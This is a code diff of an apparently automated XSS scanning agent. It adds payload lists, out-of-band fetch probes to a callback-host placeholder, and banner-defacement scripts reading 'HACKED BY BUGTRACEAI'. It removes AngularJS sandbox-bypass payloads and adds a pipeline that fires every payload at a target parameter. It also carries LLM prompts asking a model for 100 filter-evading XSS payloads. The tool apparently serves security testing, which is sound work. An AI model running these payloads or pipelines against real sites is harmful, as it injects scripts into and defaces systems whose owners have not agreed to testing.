@@ -133,9 +133,24 @@ class XSSAgent(BaseAgent, TechContextMixin):
 
     # Alternative probe for servers that error on double quotes
     PROBE_STRING_SAFE = "BT7331xss"
-    
+
+    # ====== OMNIPROBE: Reconnaissance payload for Phase 1 ======
+    # Purpose: Detect reflection points and escaping behavior for XSS only
+    # Tests: quotes, backslash-quotes, HTML tags, backticks
+    # NO CSTI/SSTI templates - that's CSTIAgent's job
+    # NO execution code - just probing what survives
+    OMNIPROBE_PAYLOAD = "BT7331'\"<>`\\'\\\""
+
     # Elite payloads that bypass many WAFs - Pure XSS (CSTI now handled by CSTIAgent)
     GOLDEN_PAYLOADS = [
+        # ====== CRITICAL: BACKSLASH-QUOTE BREAKOUTS (ginandjuice.shop killer) ======
+        # These MUST be in top 20 to be tested. For JS contexts where server escapes \ to \\ but not quotes.
+        # Input: \' → Server: \\' = escaped backslash + unescaped quote = BREAKOUT
+        "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
+        "\\';alert(document.domain)//",
+        "\\\";var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
+        "\\\";alert(document.domain)//",
+
         # ====== HIGH PRIORITY ELITE PAYLOADS (VISUAL + OOB) ======
     # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
     "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
@@ -163,11 +178,8 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "';{const d=document.createElement('div');d.style='position:fixed;top:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-size:24px;font-weight:bold;';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)};//", # USER SUGGESTED VISUAL BREAKOUT
         "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
         "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
-        "\\';alert(document.domain)//",
-        # BACKSLASH-QUOTE BREAKOUT WITH BACKTICKS (ginandjuice.shop killer)
-        # For JS contexts where quotes are escaped but backticks are not
-        "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
         "<details open ontoggle=fetch('https://{{interactsh_url}}')>"
+        # NOTE: Backslash-quote breakouts moved to TOP of array for priority testing
     ]
     
     # Fragment-based payloads (DOM XSS via location.hash → innerHTML)
@@ -188,20 +200,6 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
     ]
 
-    # Angular CSTI payloads - use DOUBLE QUOTES only (single quotes cause 500 on many servers)
-    # These work on AngularJS 1.x with ng-app on the page
-    ANGULAR_CSTI_PAYLOADS = [
-        # Basic CSTI test
-        "{{7*7}}",
-        # Angular 1.x sandbox bypass - Function constructor
-        '{{constructor.constructor("alert(1)")()}}',
-        # Visual payload using String.fromCharCode to avoid quote issues
-        # This creates: <div style="...">HACKED BY BUGTRACEAI</div>
-        '{{constructor.constructor("document.write(String.fromCharCode(60,100,105,118,32,115,116,121,108,101,61,34,112,111,115,105,116,105,111,110,58,102,105,120,101,100,59,116,111,112,58,48,59,108,101,102,116,58,48,59,119,105,100,116,104,58,49,48,48,37,59,98,97,99,107,103,114,111,117,110,100,58,114,101,100,59,99,111,108,111,114,58,119,104,105,116,101,59,116,101,120,116,45,97,108,105,103,110,58,99,101,110,116,101,114,59,112,97,100,100,105,110,103,58,50,48,112,120,59,102,111,110,116,45,115,105,122,101,58,50,52,112,120,59,122,45,105,110,100,101,120,58,57,57,57,57,57,34,62,72,65,67,75,69,68,32,66,89,32,66,85,71,84,82,65,67,69,65,73,60,47,100,105,118,62))")()}}',
-        # Simpler visual - prepend div
-        '{{constructor.constructor("var d=document.createElement(String.fromCharCode(100,105,118));d.id=String.fromCharCode(98,116,45,112,119,110);d.innerHTML=String.fromCharCode(72,65,67,75,69,68);document.body.prepend(d)")()}}',
-    ]
-    
     def __init__(
         self,
         url: str,
@@ -222,10 +220,9 @@ class XSSAgent(BaseAgent, TechContextMixin):
 
         # Tools
         self.interactsh: Optional[InteractshClient] = None
-        # v3.2: Enable CDP as fallback for deep validation
-        # Exploitation phase is single-threaded per-agent, so CDP is safe here.
-        # Flow: HTTP → Playwright (L3) → CDP (L4) → CANDIDATE
-        self.verifier = XSSVerifier(headless=headless, prefer_cdp=True)
+        # v3.2.1: CDP disabled - Playwright only (L3)
+        # Flow: HTTP → Playwright (L3) → VALIDATED_CONFIRMED
+        self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
         self.payload_learner = PayloadLearner()
 
         # Results
@@ -314,17 +311,19 @@ class XSSAgent(BaseAgent, TechContextMixin):
         """
         Phase 1: Quick omniprobe test using Go fuzzer.
 
-        Uses the OMNI-PROBE payload (XSS + CSTI + SSTI polyglot) for
-        fast initial detection.
+        Uses OMNIPROBE_PAYLOAD for reconnaissance - tests what characters
+        survive and where they reflect. NO execution code.
+
+        Probe tests: ' " < > ` \\' \\" {{7*7}} ${7*7}
 
         Returns:
-            Reflection if payload reflected, None otherwise
+            Reflection with context info if reflected, None otherwise
         """
         if not self._go_bridge:
             return None
 
-        # Use the OMNI-PROBE from GOLDEN_PAYLOADS
-        omniprobe = self.GOLDEN_PAYLOADS[0].replace("{{interactsh_url}}", interactsh_url)
+        # Use dedicated OMNIPROBE_PAYLOAD for reconnaissance (not GOLDEN_PAYLOADS)
+        omniprobe = self.OMNIPROBE_PAYLOAD
 
         dashboard.log(f"[{self.name}] ⚡ Phase 1: Go Omniprobe on '{param}'", "INFO")
         dashboard.set_current_payload(omniprobe[:50], "XSS Omniprobe", "Testing")
@@ -791,40 +790,23 @@ class XSSAgent(BaseAgent, TechContextMixin):
 
         html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, _ = probe_data
 
-        # === PHASE 0.5: ANGULAR CSTI CHECK (HIGH PRIORITY) ===
-        global_context = context_data.get("global_context", "")
-        if "AngularJS" in global_context or "ng-app" in html.lower():
-            dashboard.log(f"[{self.name}] 🅰️ Angular detected! Testing CSTI payloads first...", "INFO")
-            angular_finding = await self._test_angular_csti(param, screenshots_dir, reflection_type, surviving_chars, injection_ctx)
-            if angular_finding:
-                return angular_finding
-
         # Skip if no reflection detected and not blocked
         if not context_data.get("reflected") and not context_data.get("is_blocked"):
             dashboard.log(f"[{self.name}] No reflection on '{param}', skipping hybrid", "INFO")
             return None
 
-        # === PHASE 1: OMNIPROBE (Quick check) ===
+        # === PHASE 1: OMNIPROBE (Reconnaissance) ===
+        # Purpose: Detect reflection points and what characters survive
+        # Does NOT exploit - just gathers context for Phase 2
         omni_reflection = await self._hybrid_phase1_omniprobe(param, interactsh_url)
-        if omni_reflection and omni_reflection.is_suspicious:
-            # Omniprobe looked promising - validate immediately
-            omni_payload = self.GOLDEN_PAYLOADS[0].replace("{{interactsh_url}}", interactsh_url)
-            evidence = await self._validate_via_browser(self.url, param, omni_payload)
-            if evidence:
-                return self._create_xss_finding(
-                    param=param,
-                    payload=omni_payload,
-                    context="Omniprobe direct hit",
-                    validation_method="hybrid_omniprobe",
-                    evidence=evidence,
-                    confidence=0.98,
-                    reflection_type=reflection_type,
-                    surviving_chars=surviving_chars,
-                    successful_payloads=[omni_payload],
-                    injection_ctx=injection_ctx,
-                    bypass_technique="omniprobe_polyglot",
-                    bypass_explanation="OMNI-PROBE polyglot achieved direct execution"
-                )
+        if omni_reflection:
+            # Log what we learned from the probe
+            dashboard.log(
+                f"[{self.name}] 🔍 Omniprobe results: context={omni_reflection.context}, "
+                f"encoded={omni_reflection.encoded}, suspicious={omni_reflection.is_suspicious}",
+                "INFO"
+            )
+            # Context info passed to Phase 2 via context_data (already available)
 
         # === PHASE 2: SEED GENERATION (LLM) ===
         seeds = await self._hybrid_phase2_seed_generation(
@@ -850,31 +832,73 @@ class XSSAgent(BaseAgent, TechContextMixin):
             payloads=amplified_payloads
         )
 
-        # === PHASE 4.5: VISUAL PAYLOAD GENERATION (DeepSeek) ===
-        # If we have reflections, generate visual payloads with "HACKED BY BUGTRACEAI"
-        # This is the BULLETPROOF validation: LLM generates banner payloads → Screenshot → Vision confirms
-        visual_payloads = await self._hybrid_phase45_visual_generation(
-            param=param,
-            fuzz_result=fuzz_result
-        )
+        # === PHASE 4.5 ↔ 5 RETRY LOOP ===
+        # If visual validation fails, retry Phase 4.5 with feedback about failed payloads
+        # Max 3 attempts before falling back to regular candidates only
+        max_visual_retries = 3
+        failed_visual_payloads: List[str] = []
+        finding = None
 
-        # === PHASE 5: VALIDATION (Python/Playwright) ===
-        finding = await self._hybrid_phase5_validation(
-            param=param,
-            fuzz_result=fuzz_result,
-            screenshots_dir=screenshots_dir,
-            reflection_type=reflection_type,
-            surviving_chars=surviving_chars,
-            injection_ctx=injection_ctx,
-            visual_payloads=visual_payloads  # Pass visual payloads for priority testing
-        )
+        for attempt in range(max_visual_retries):
+            # === PHASE 4.5: VISUAL PAYLOAD GENERATION (DeepSeek) ===
+            visual_payloads = await self._hybrid_phase45_visual_generation(
+                param=param,
+                fuzz_result=fuzz_result,
+                failed_payloads=failed_visual_payloads  # Pass failed payloads to avoid
+            )
+
+            if not visual_payloads:
+                dashboard.log(
+                    f"[{self.name}] Phase 4.5: No visual payloads generated (attempt {attempt+1}/{max_visual_retries})",
+                    "WARN"
+                )
+                break  # No point retrying if LLM can't generate payloads
+
+            # === PHASE 5: VALIDATION (Python/Playwright) ===
+            finding = await self._hybrid_phase5_validation(
+                param=param,
+                fuzz_result=fuzz_result,
+                screenshots_dir=screenshots_dir,
+                reflection_type=reflection_type,
+                surviving_chars=surviving_chars,
+                injection_ctx=injection_ctx,
+                visual_payloads=visual_payloads
+            )
+
+            if finding:
+                # Success! Visual payload worked
+                return finding
+
+            # Visual validation failed - add to failed list and retry
+            failed_visual_payloads.extend(visual_payloads)
+            dashboard.log(
+                f"[{self.name}] Phase 5 failed, retrying Phase 4.5 (attempt {attempt+1}/{max_visual_retries})",
+                "WARN"
+            )
+
+        # All visual attempts failed - try regular candidates one last time
+        if not finding:
+            dashboard.log(
+                f"[{self.name}] All visual retries exhausted, final attempt with regular candidates",
+                "WARN"
+            )
+            finding = await self._hybrid_phase5_validation(
+                param=param,
+                fuzz_result=fuzz_result,
+                screenshots_dir=screenshots_dir,
+                reflection_type=reflection_type,
+                surviving_chars=surviving_chars,
+                injection_ctx=injection_ctx,
+                visual_payloads=[]  # No visual payloads, only regular candidates
+            )
 
         return finding
 
     async def _hybrid_phase45_visual_generation(
         self,
         param: str,
-        fuzz_result: "FuzzResult"
+        fuzz_result: "FuzzResult",
+        failed_payloads: List[str] = None
     ) -> List[str]:
         """
         Phase 4.5: Generate visual payloads from WORKING payloads.
@@ -891,10 +915,14 @@ class XSSAgent(BaseAgent, TechContextMixin):
         Args:
             param: Parameter name
             fuzz_result: Results from Go fuzzer with reflection contexts
+            failed_payloads: Payloads that failed in previous attempts (to avoid)
 
         Returns:
             List of visual payloads based on WORKING payloads
         """
+        if failed_payloads is None:
+            failed_payloads = []
+
         if not fuzz_result.reflections:
             return []
 
@@ -912,13 +940,14 @@ class XSSAgent(BaseAgent, TechContextMixin):
         if not working_payloads:
             return []
 
+        retry_info = f" (retry, avoiding {len(failed_payloads)} failed)" if failed_payloads else ""
         dashboard.log(
-            f"[{self.name}] 🎨 Phase 4.5: Found {len(working_payloads)} WORKING payloads, asking LLM for visual versions",
+            f"[{self.name}] 🎨 Phase 4.5: Found {len(working_payloads)} WORKING payloads, asking LLM for visual versions{retry_info}",
             "INFO"
         )
 
         # Ask DeepSeek to adapt the WORKING payloads to include the visual banner
-        visual_payloads = await self._adapt_working_payloads_to_visual(working_payloads)
+        visual_payloads = await self._adapt_working_payloads_to_visual(working_payloads, failed_payloads)
 
         if visual_payloads:
             dashboard.log(
@@ -930,7 +959,8 @@ class XSSAgent(BaseAgent, TechContextMixin):
 
     async def _adapt_working_payloads_to_visual(
         self,
-        working_payloads: List[Dict[str, str]]
+        working_payloads: List[Dict[str, str]],
+        failed_payloads: List[str] = None
     ) -> List[str]:
         """
         Ask LLM to adapt WORKING payloads to include the visual banner.
@@ -941,17 +971,37 @@ class XSSAgent(BaseAgent, TechContextMixin):
 
         Args:
             working_payloads: List of dicts with 'payload' and 'context'
+            failed_payloads: Payloads that already failed (to avoid regenerating)
 
         Returns:
             List of visual payloads
         """
         from bugtrace.core.llm_client import llm_client
 
+        if failed_payloads is None:
+            failed_payloads = []
+
         # Format working payloads for the prompt
         payloads_str = "\n".join([
             f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
             for p in working_payloads[:5]
         ])
+
+        # Add failed payloads warning if retrying
+        failed_warning = ""
+        if failed_payloads:
+            failed_samples = "\n".join([f"- {p[:80]}..." for p in failed_payloads[:5]])
+            failed_warning = f"""
+
+IMPORTANT: These payloads ALREADY FAILED validation. Generate DIFFERENT ones:
+{failed_samples}
+
+Try different approaches:
+- Different DOM manipulation methods (createElement vs innerHTML vs insertAdjacentHTML)
+- Different event handlers (onerror, onload, onfocus)
+- Different element types (div, img, svg, iframe)
+- Different string concatenation techniques
+"""
 
         prompt = f"""You are an XSS expert. These payloads SUCCESSFULLY REFLECTED on the target:
 
@@ -972,7 +1022,7 @@ Example transformations:
 - If payload is: "><script>alert(1)</script>
   Visual version: "><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div><script>
 
-Generate 10 visual versions of the working payloads. Return ONLY the payloads, one per line, no explanations."""
+Generate 10 visual versions of the working payloads. Return ONLY the payloads, one per line, no explanations.{failed_warning}"""
 
         try:
             response = await llm_client.generate(
@@ -989,19 +1039,23 @@ Generate 10 visual versions of the working payloads. Return ONLY the payloads, o
 
             # Parse payloads
             payloads = []
+            failed_set = set(failed_payloads) if failed_payloads else set()
             for line in response.strip().split("\n"):
                 line = line.strip()
                 if line and not line.startswith("#") and len(line) > 10:
                     if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                         line = line[2:].strip()
-                    payloads.append(line)
+                    # Skip payloads that already failed
+                    if line not in failed_set:
+                        payloads.append(line)
 
             # If LLM returned good payloads, use them; otherwise fallback
             if len(payloads) >= 3:
                 return payloads[:10]
             else:
                 logger.warning(f"[{self.name}] LLM returned few payloads, adding prebuilt fallback")
-                return payloads + self._build_visual_payloads_from_breakouts()
+                fallback = [p for p in self._build_visual_payloads_from_breakouts() if p not in failed_set]
+                return payloads + fallback
 
         except Exception as e:
             logger.warning(f"[{self.name}] Failed to adapt payloads: {e}, using prebuilt")
@@ -1134,6 +1188,919 @@ Each payload should target a different context or use a different breakout techn
 
     # =========================================================================
     # END HYBRID ENGINE
+    # =========================================================================
+
+    # =========================================================================
+    # PIPELINE V2: BOMBARDEO PRIMERO, ANÁLISIS DESPUÉS
+    #
+    # Philosophy: Fire ALL payloads at once, then analyze what reflected.
+    # This is faster and more efficient than the old probe-first approach.
+    #
+    # Flow:
+    #   Phase 1: BOMBARDEO TOTAL (Go fuzzer fires all payloads)
+    #   Phase 2: ANÁLISIS (analyze reflections, context, escaping)
+    #   Phase 3.1: LLM Visual Generation (~100 payloads with "HACKED BY BUGTRACEAI")
+    #   Phase 3.2: Amplification (multiply by breakouts.json)
+    #   Phase 3.3: Second Bombardment (Go fuzzer with amplified payloads)
+    #   Phase 4: Validation (conditional Playwright - skip if already confirmed)
+    #
+    # Output files (for pentester audit trail):
+    #   - phase1_bombardment.md
+    #   - phase2_analysis.md
+    #   - phase3_amplified.md
+    #   - phase4_results.md
+    # =========================================================================
+
+    async def _run_pipeline_v2(
+        self,
+        param: str,
+        interactsh_domain: str,
+        screenshots_dir: Path
+    ) -> Optional[XSSFinding]:
+        """
+        Main orchestrator for Pipeline V2: Bombardment-First approach.
+
+        Args:
+            param: Parameter to test
+            interactsh_domain: Interactsh callback domain
+            screenshots_dir: Directory for screenshots
+
+        Returns:
+            XSSFinding if XSS confirmed, None otherwise
+        """
+        interactsh_url = f"http://{interactsh_domain}" if interactsh_domain else ""
+
+        # Create XSS report directory
+        xss_report_dir = self.report_dir / "specialists" / "xss"
+        xss_report_dir.mkdir(parents=True, exist_ok=True)
+
+        dashboard.log(f"[{self.name}] 🚀 Pipeline V2: Starting bombardment-first approach on '{param}'", "INFO")
+
+        # =====================================================================
+        # PHASE 1: BOMBARDEO TOTAL
+        # Fire ALL payloads at once - curated + proven + golden
+        # =====================================================================
+        phase1_result = await self._pipeline_v2_phase1_bombardment(
+            param=param,
+            interactsh_url=interactsh_url,
+            report_dir=xss_report_dir
+        )
+
+        if not phase1_result:
+            dashboard.log(f"[{self.name}] Phase 1 failed or no reflections", "WARN")
+            return None
+
+        fuzz_result, payloads_sent = phase1_result
+
+        # =====================================================================
+        # PHASE 2: ANÁLISIS
+        # Analyze what reflected, in what context, what escaping applied
+        # =====================================================================
+        analysis = await self._pipeline_v2_phase2_analysis(
+            fuzz_result=fuzz_result,
+            report_dir=xss_report_dir
+        )
+
+        # Check if Interactsh confirmed (100% confidence - skip to Phase 4)
+        if analysis.get("interactsh_confirmed"):
+            dashboard.log(f"[{self.name}] 🎯 Interactsh callback received! XSS CONFIRMED.", "SUCCESS")
+            finding = self._create_finding_from_interactsh(
+                param=param,
+                payload=analysis["confirmed_payload"],
+                evidence=analysis["evidence"],
+                screenshots_dir=screenshots_dir
+            )
+            self._save_phase4_report(xss_report_dir, finding, "interactsh")
+            return finding
+
+        # If no reflections at all, abort
+        if not analysis.get("reflections"):
+            dashboard.log(f"[{self.name}] Phase 2: No reflections found, aborting", "WARN")
+            return None
+
+        # =====================================================================
+        # PHASE 3.1: LLM VISUAL GENERATION
+        # Generate ~100 payloads with "HACKED BY BUGTRACEAI" based on reflections
+        # =====================================================================
+        visual_payloads = await self._pipeline_v2_phase3_llm_visual(
+            reflections=analysis["reflections"],
+            contexts=analysis["contexts"],
+            escaping=analysis["escaping"]
+        )
+
+        # =====================================================================
+        # PHASE 3.2: AMPLIFICATION
+        # Multiply visual payloads by breakouts.json prefixes
+        # =====================================================================
+        amplified_payloads = self._pipeline_v2_phase3_amplify(
+            visual_payloads=visual_payloads,
+            contexts=analysis["contexts"]
+        )
+
+        # =====================================================================
+        # PHASE 3.3: SECOND BOMBARDMENT
+        # Fire amplified payloads with Go fuzzer
+        # =====================================================================
+        phase3_result = await self._pipeline_v2_phase3_attack(
+            param=param,
+            payloads=amplified_payloads,
+            report_dir=xss_report_dir
+        )
+
+        # =====================================================================
+        # PHASE 4: VALIDATION
+        # Conditional Playwright - skip if high confidence from HTTP
+        # =====================================================================
+        finding = await self._pipeline_v2_phase4_validation(
+            param=param,
+            phase1_result=fuzz_result,
+            phase3_result=phase3_result,
+            analysis=analysis,
+            screenshots_dir=screenshots_dir,
+            report_dir=xss_report_dir
+        )
+
+        return finding
+
+    async def _pipeline_v2_phase1_bombardment(
+        self,
+        param: str,
+        interactsh_url: str,
+        report_dir: Path
+    ) -> Optional[Tuple["FuzzResult", List[str]]]:
+        """
+        Phase 1: BOMBARDEO TOTAL - Fire ALL payloads at once.
+
+        Combines:
+        - OMNIPROBE_PAYLOAD (for context detection)
+        - curated_list (highest priority)
+        - proven_payloads (dynamic memory)
+        - GOLDEN_PAYLOADS (defaults)
+
+        Args:
+            param: Parameter to fuzz
+            interactsh_url: Interactsh callback URL for OOB detection
+            report_dir: Directory to save phase report
+
+        Returns:
+            Tuple of (FuzzResult, list of payloads sent)
+        """
+        dashboard.log(f"[{self.name}] ⚡ Phase 1: BOMBARDEO TOTAL on '{param}'", "INFO")
+        dashboard.set_status("XSS Phase 1", f"Bombarding {param}")
+
+        # Build mega payload list
+        all_payloads = []
+        seen = set()
+
+        # 1. OMNIPROBE first (for context detection)
+        all_payloads.append(self.OMNIPROBE_PAYLOAD)
+        seen.add(self.OMNIPROBE_PAYLOAD)
+
+        # 2. Curated list (highest priority) - use PayloadLearner
+        prioritized = self.payload_learner.get_prioritized_payloads(
+            default_list=self.GOLDEN_PAYLOADS
+        )
+
+        for p in prioritized:
+            # Replace Interactsh placeholder
+            payload = p.replace("{{interactsh_url}}", interactsh_url) if interactsh_url else p
+            if payload not in seen:
+                all_payloads.append(payload)
+                seen.add(payload)
+
+        # 3. Fragment payloads for DOM XSS
+        for fp in self.FRAGMENT_PAYLOADS:
+            payload = fp.replace("{{interactsh_url}}", interactsh_url) if interactsh_url else fp
+            if payload not in seen:
+                all_payloads.append(payload)
+                seen.add(payload)
+
+        dashboard.log(f"[{self.name}] 📦 Phase 1: {len(all_payloads)} payloads ready to fire", "INFO")
+
+        # Fire using Go fuzzer
+        if not self._go_bridge:
+            await self._init_hybrid_engine()
+
+        if not self._go_bridge:
+            logger.error(f"[{self.name}] Go bridge unavailable, cannot run Phase 1")
+            return None
+
+        result = await self._go_bridge.run(
+            url=self.url,
+            param=param,
+            payloads=all_payloads
+        )
+
+        # Save phase report
+        self._save_phase1_report(report_dir, param, all_payloads, result)
+
+        dashboard.log(
+            f"[{self.name}] 📊 Phase 1 complete: {result.total_requests} requests, "
+            f"{len(result.reflections)} reflections @ {result.requests_per_second:.1f} req/s",
+            "INFO"
+        )
+
+        return (result, all_payloads)
+
+    async def _pipeline_v2_phase2_analysis(
+        self,
+        fuzz_result: "FuzzResult",
+        report_dir: Path
+    ) -> Dict[str, Any]:
+        """
+        Phase 2: ANÁLISIS - Analyze all responses from Phase 1.
+
+        Determines:
+        - Which payloads reflected
+        - In what context (JS string, HTML attr, etc.)
+        - What escaping the server applied
+        - If Interactsh callback was received
+
+        Args:
+            fuzz_result: Results from Phase 1 bombardment
+            report_dir: Directory to save phase report
+
+        Returns:
+            Analysis dict with reflections, contexts, escaping, and confirmation status
+        """
+        dashboard.log(f"[{self.name}] 🔍 Phase 2: Analyzing {len(fuzz_result.reflections)} reflections", "INFO")
+        dashboard.set_status("XSS Phase 2", "Analyzing responses")
+
+        analysis = {
+            "reflections": [],
+            "contexts": set(),
+            "escaping": {},
+            "interactsh_confirmed": False,
+            "confirmed_payload": None,
+            "evidence": {},
+            "high_confidence_candidates": []
+        }
+
+        # Check Interactsh for callbacks
+        if self.interactsh:
+            try:
+                interactions = await self.interactsh.poll()
+                if interactions:
+                    analysis["interactsh_confirmed"] = True
+                    # Find the payload that triggered the callback
+                    for ref in fuzz_result.reflections:
+                        if "interactsh" in ref.payload.lower() or self.interactsh.domain in ref.payload:
+                            analysis["confirmed_payload"] = ref.payload
+                            break
+                    analysis["evidence"] = {
+                        "method": "Interactsh OOB Callback",
+                        "interactions": len(interactions),
+                        "confidence": 1.0
+                    }
+                    dashboard.log(f"[{self.name}] 🎯 Interactsh confirmed XSS!", "SUCCESS")
+            except Exception as e:
+                logger.debug(f"Interactsh poll error: {e}")
+
+        # Analyze each reflection
+        for ref in fuzz_result.reflections:
+            reflection_data = {
+                "payload": ref.payload,
+                "context": ref.context,
+                "encoded": ref.encoded,
+                "encoding_type": ref.encoding_type,
+                "status_code": ref.status_code,
+                "is_suspicious": ref.is_suspicious
+            }
+            analysis["reflections"].append(reflection_data)
+            analysis["contexts"].add(ref.context)
+
+            # Track escaping per context
+            if ref.encoded:
+                if ref.context not in analysis["escaping"]:
+                    analysis["escaping"][ref.context] = []
+                analysis["escaping"][ref.context].append(ref.encoding_type)
+
+            # High confidence candidates (unencoded in dangerous context)
+            if ref.is_suspicious:
+                analysis["high_confidence_candidates"].append(ref)
+
+        analysis["contexts"] = list(analysis["contexts"])
+
+        # Save phase report
+        self._save_phase2_report(report_dir, analysis)
+
+        dashboard.log(
+            f"[{self.name}] 📊 Phase 2 complete: {len(analysis['reflections'])} reflections, "
+            f"contexts={analysis['contexts']}, high_conf={len(analysis['high_confidence_candidates'])}",
+            "INFO"
+        )
+
+        return analysis
+
+    async def _pipeline_v2_phase3_llm_visual(
+        self,
+        reflections: List[Dict],
+        contexts: List[str],
+        escaping: Dict[str, List[str]]
+    ) -> List[str]:
+        """
+        Phase 3.1: LLM Visual Generation - Generate ~100 payloads with banner.
+
+        Takes the payloads that REFLECTED and asks LLM to create versions
+        that display "HACKED BY BUGTRACEAI" banner.
+
+        Args:
+            reflections: List of reflection data from Phase 2
+            contexts: List of detected contexts
+            escaping: Escaping info per context
+
+        Returns:
+            List of ~100 visual payloads
+        """
+        dashboard.log(f"[{self.name}] 🎨 Phase 3.1: Generating visual payloads via LLM", "INFO")
+        dashboard.set_status("XSS Phase 3.1", "LLM visual generation")
+
+        # Get top reflections to use as seeds
+        working_payloads = []
+        for ref in reflections[:20]:  # Top 20 that reflected
+            working_payloads.append({
+                "payload": ref["payload"],
+                "context": ref["context"]
+            })
+
+        if not working_payloads:
+            # Fallback: use GOLDEN_PAYLOADS if nothing reflected
+            dashboard.log(f"[{self.name}] No reflections, using GOLDEN_PAYLOADS as seeds", "WARN")
+            working_payloads = [{"payload": p, "context": "unknown"} for p in self.GOLDEN_PAYLOADS[:10]]
+
+        # Format for LLM
+        payloads_str = "\n".join([
+            f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
+            for p in working_payloads[:10]
+        ])
+
+        contexts_str = ", ".join(contexts) if contexts else "unknown"
+        escaping_str = json.dumps(escaping, indent=2) if escaping else "none detected"
+
+        prompt = f"""You are an elite XSS expert. These payloads REFLECTED on the target:
+
+{payloads_str}
+
+Detected contexts: {contexts_str}
+Server escaping behavior: {escaping_str}
+
+YOUR MISSION: Generate 100 XSS payloads that will inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI".
+
+CRITICAL RULES:
+1. Keep the breakout technique that made the original payload reflect
+2. Use BACKTICKS (`) for strings to avoid escaping issues
+3. The banner MUST be visible at top of page with this style:
+   position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999
+
+4. VARY your approaches:
+   - Different DOM manipulation (createElement, innerHTML, insertAdjacentHTML)
+   - Different event handlers (onerror, onload, onfocus, ontoggle)
+   - Different elements (div, img, svg, iframe, details)
+   - Different quote styles (`, ', ")
+   - Different breakout prefixes (\\', \\", '>, ">, </script>)
+
+EXAMPLE PAYLOADS:
+\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//
+"><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999">HACKED BY BUGTRACEAI</div>
+<svg onload="var d=document.createElement('div');d.id='bt-pwn';d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)">
+
+Return EXACTLY 100 payloads, one per line, no explanations, no numbering."""
+
+        try:
+            response = await llm_client.generate(
+                prompt=prompt,
+                module_name="XSS-VisualGen-V2",
+                model_override=settings.MUTATION_MODEL,
+                temperature=0.8,  # Higher for variety
+                max_tokens=8000   # Need space for 100 payloads
+            )
+
+            if not response:
+                return self._fallback_visual_payloads()
+
+            # Parse payloads
+            visual_payloads = []
+            for line in response.strip().split("\n"):
+                line = line.strip()
+                if not line or line.startswith("#") or line.startswith("//"):
+                    continue
+                # Remove numbering
+                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
+                    line = line[2:].strip()
+                if line and len(line) > 15:
+                    visual_payloads.append(line)
+
+            dashboard.log(f"[{self.name}] 🎯 Phase 3.1: Generated {len(visual_payloads)} visual payloads", "SUCCESS")
+
+            # Ensure we have at least some payloads
+            if len(visual_payloads) < 20:
+                visual_payloads.extend(self._fallback_visual_payloads())
+
+            return visual_payloads[:100]  # Cap at 100
+
+        except Exception as e:
+            logger.warning(f"[{self.name}] Phase 3.1 LLM failed: {e}, using fallback")
+            return self._fallback_visual_payloads()
+
+    def _fallback_visual_payloads(self) -> List[str]:
+        """Generate fallback visual payloads if LLM fails."""
+        JS_VISUAL = "var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"
+        HTML_VISUAL = '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999">HACKED BY BUGTRACEAI</div>'
+
+        # JS_VISUAL with single quotes instead of backticks for event handlers
+        JS_VISUAL_SQ = JS_VISUAL.replace('`', "'")
+
+        fallback = [
+            f"\\';{JS_VISUAL}",
+            f"\\\";{JS_VISUAL}",
+            f"';{JS_VISUAL}",
+            f"\";{JS_VISUAL}",
+            f"\">{HTML_VISUAL}",
+            f"'>{HTML_VISUAL}",
+            f"</script>{HTML_VISUAL}<script>",
+            f'<svg onload="{JS_VISUAL_SQ}">',
+            f'<img src=x onerror="{JS_VISUAL_SQ}">',
+            f'<details open ontoggle="{JS_VISUAL_SQ}">',
+        ]
+        return fallback
+
+    def _pipeline_v2_phase3_amplify(
+        self,
+        visual_payloads: List[str],
+        contexts: List[str]
+    ) -> List[str]:
+        """
